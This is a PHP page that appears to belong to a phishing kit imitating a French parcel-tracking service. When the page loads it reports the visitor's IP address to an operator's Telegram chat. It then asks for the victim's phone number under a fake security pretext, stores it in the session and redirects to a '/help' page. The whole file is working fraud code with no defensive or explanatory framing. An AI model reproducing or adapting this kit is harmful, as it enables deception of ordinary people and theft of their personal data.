<?php

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (isset($_POST['phone'])) {
        $_SESSION["phone"] = $_POST["phone"];
        header("location: /help");
    }

    die();
}

telegram_api($rez["token"], "sendMessage", [
    "chat_id" => $rez["cliques"],
    "text" => $ip . " a cliquer",
    "parse_mode" => "HTML",
]);
$header = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/header.php');
$footer = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/footer.php');
$html = (function () {
    global $rez;
    ob_start();
?>
    <form method="post">
        <div class="breadcrumb">
            <div class="grid">
                <div class="row">
                    <ul>
                        <li><a href="#/">
                                Accueil</a></li>
                        <li class="active">Suivi de colis</li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="internal-page suivi">
            <div class="grid">
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12 mt-5 center">
                    </div>
                </div>
            </div>
            <div class="main">

                <div data-v-67007474="" id="tracking-wrapper" class="app-wrapper">
                    <div data-v-577ebd12="" data-v-67007474="">
                        <div class="suivi-colis-page">
                            <div data-v-577ebd12="" class="input-zone">
                                <h2 data-v-577ebd12="">Numéro de colis</h2>
                                <input type="text" class="parcelNumber" id="parcel" name="parcel" disabled="" style="background-color: #e9ecef;" value="<?= $rez["suivi"] ?>">
                                <p class="info-container" data-v-577ebd12="">
                                    Pour simplifier la démarche, votre numéro de colis est déjà pré-rempli.<br><br>
                                    Pour des raisons de sécurité, veuillez entrer votre numéro de téléphone afin de vérifier que ce colis vous est bien destiné.
                                </p>
                                <div class="form-row" style="width: 100%;">
                                    <label for="tracking_form_phone" class="required">Numéro de téléphone</label>
                                    <input type="tel" id="tracking_form_phone" name="phone" required="required" placeholder="Entrez votre numéro de téléphone">
                                </div>
                                <div>
                                    <button type="submit" id="tracking_form_submit" class="btn btn-primary btn-suivi">Rechercher mon colis</button>
                                </div>
                            </div>
    </form>
    <div id="loader-div-new" class="hidden-class-new">
        <div id="mask-id-new"></div>
        <div class="spinner-class-new"></div>
    </div>
    <script>
        document.querySelector("form").addEventListener("submit", function(e) {
            document.getElementById("loader-div-new").style.visibility = "visible";
            document.getElementById("mask-id-new").style = "opacity: 1; bottom: -500px;"
        })
    </script>
    </div>

    </div>
    </div>
    </div>
    </form>


<?php
    return ob_get_clean();
})();

$html = $header . $html . $footer;
require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/base.php');
?>